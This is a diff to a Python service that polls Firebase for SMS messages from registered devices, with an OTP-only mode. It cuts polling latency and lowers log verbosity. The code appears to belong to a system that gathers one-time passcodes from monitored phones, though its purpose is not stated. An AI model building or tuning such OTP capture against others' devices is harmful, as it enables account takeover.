@@ -11,15 +11,25 @@ from typing import Any
 
 import httpx
 
+from app.config import get_settings
 from app.database import Device, MonitorProfile, SessionLocal
 from app.firebase_client import _fetch_json, firebase_root_url, get_poll_workers
 from app.services import get_active_device, get_monitor_profile, save_sms
 
 logger = logging.getLogger(__name__)
 
-POLL_INTERVAL_SEC = 1.0
-POLL_FETCH_TIMEOUT_SEC = 2.0
+POLL_INTERVAL_SEC = 0.4
+POLL_FETCH_TIMEOUT_SEC = 1.2
 SNAPSHOT_TIMEOUT_SEC = 5.0
+
+
+def _otp_poll_interval() -> float:
+    return max(0.25, get_settings().otp_poll_interval_sec)
+
+
+def _otp_poll_timeout() -> float:
+    return max(0.8, get_settings().otp_poll_timeout_sec)
+
 MONITORING_START_SNAPSHOT_SEC = 4.0
 MAX_POLL_PATHS_FALLBACK = 8
 POLL_PROFILE_CONCURRENCY = 1
@@ -720,7 +730,7 @@ async def _fetch_path_records(root: str, path: str, timeout: float) -> list[dict
             f"{root}/{path}.json"
             f'?orderBy=%22%24key%22&limitToLast={RECENT_MESSAGES_LIMIT}'
         )
-        logger.info("Firebase OTP poll GET %s (last %s)", path, RECENT_MESSAGES_LIMIT)
+        logger.debug("Firebase OTP poll GET %s (last %s)", path, RECENT_MESSAGES_LIMIT)
     else:
         url = f"{root}/{path}.json"
     try:
@@ -732,7 +742,7 @@ async def _fetch_path_records(root: str, path: str, timeout: float) -> list[dict
 
     records = _extract_sms_records(path, data)
     if _MESSAGES_DEVICE_PATH_RE.match(path) and records:
-        logger.info("Firebase OTP poll %s -> %s SMS parsed", path, len(records))
+        logger.debug("Firebase OTP poll %s -> %s SMS parsed", path, len(records))
     return records
 
 
@@ -1081,12 +1091,13 @@ async def _ensure_messages_high_water(
     if not device_id:
         return 0
 
-    high_water = await _fetch_messages_high_water(root, device_id, POLL_FETCH_TIMEOUT_SEC)
+    fetch_timeout = _otp_poll_timeout()
+    high_water = await _fetch_messages_high_water(root, device_id, fetch_timeout)
     if not high_water:
         records = await _fetch_path_records(
             root,
             f"messages/{device_id}",
-            POLL_FETCH_TIMEOUT_SEC,
+            fetch_timeout,
         )
         push_ids = [pid for pid in (_message_push_id(record) for record in records) if pid]
         if push_ids:
@@ -1122,9 +1133,10 @@ async def _poll_messages_otp_only(
     root = firebase_root_url(firebase_url)
     path = f"messages/{device_id}"
     try:
+        fetch_timeout = _otp_poll_timeout()
         records = await asyncio.wait_for(
-            _fetch_path_records(root, path, POLL_FETCH_TIMEOUT_SEC),
-            timeout=POLL_FETCH_TIMEOUT_SEC + 2,
+            _fetch_path_records(root, path, fetch_timeout),
+            timeout=fetch_timeout + 1.5,
         )
     except (asyncio.TimeoutError, httpx.HTTPError, Exception) as exc:
         logger.warning("OTP poll failed device=%s: %s", device_id, exc)
@@ -1238,10 +1250,11 @@ async def poll_monitoring_profiles_once() -> int:
 
 async def run_firebase_sms_poll_loop() -> None:
     while True:
+        poll_timeout = _otp_poll_timeout()
         try:
             count = await asyncio.wait_for(
                 poll_monitoring_profiles_once(),
-                timeout=POLL_FETCH_TIMEOUT_SEC + 6,
+                timeout=poll_timeout + 4,
             )
             if count:
                 logger.info("Firebase SMS poll delivered %s message(s)", count)
@@ -1249,8 +1262,7 @@ async def run_firebase_sms_poll_loop() -> None:
             logger.warning("Firebase SMS poll cycle timed out")
         except Exception as exc:
             logger.exception("Firebase SMS poll loop error: %s", exc)
-        await asyncio.sleep(POLL_INTERVAL_SEC)
-        await asyncio.sleep(0)
+        await asyncio.sleep(_otp_poll_interval())
 
 
 async def finish_monitoring_baseline(profile_id: int, device_id: int) -> int:
